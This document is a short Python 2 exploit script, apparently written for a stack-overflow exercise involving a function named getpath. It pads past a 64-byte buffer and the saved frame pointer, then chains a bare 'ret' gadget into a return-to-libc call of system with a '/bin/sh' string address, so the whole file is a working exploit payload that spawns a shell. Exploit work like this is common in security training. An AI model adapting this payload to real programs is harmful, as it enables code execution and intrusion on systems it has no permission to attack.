#!/usr/bin/python2.6

import struct

buffer_sz = 64
ovw_stack_frame_sz = 76 # Overwritable stack frame, starting from buffer until we reach ebp (exclusive)

ret = struct.pack("P", 0x8048544) # 0x8048544 <getpath+128>:        ret
system = struct.pack("P", 0xb7ecffb0) # system
return_after_system = struct.pack("P", 0x41414141)
bin_sh = struct.pack("P", (0xb7e97000+0x11f3bf)) # "/bin/sh\0"

gadget1 = ret   # a "nop" gadget as a workaround against the return address restriction
gadget2 = system + return_after_system + bin_sh

padding = "A"*(ovw_stack_frame_sz+4) # We also overwrite ebp

payload = padding + gadget1 + gadget2
print(payload)
